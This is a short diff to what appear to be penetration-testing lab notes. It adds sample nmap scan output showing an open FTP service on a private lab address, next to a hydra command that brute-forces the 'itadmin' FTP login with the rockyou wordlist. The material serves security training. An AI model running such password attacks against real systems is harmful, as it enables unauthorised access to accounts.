@@ -44,6 +44,16 @@ Lab 2 - Enumerate Password Attacks - RDP - VM #1 and find another network servic
 ># Enumerate Network Services with Nmap
 >kali@kali:~$ nmap -sV 192.168.123.202
 >
+># ========== Expected Result ==========
+>Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 11:39 CST
+>Nmap scan report for 192.168.123.202
+>Host is up (0.079s latency).
+>Not shown: 993 closed tcp ports (reset)
+>PORT     STATE SERVICE       VERSION
+>21/tcp   open  ftp           FileZilla ftpd 1.4.1
+>...
+># =====================================
+>
 ># Password Attack Against FTP (itadmin)
 >kali@kali:~$ hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.123.202 -f
 >
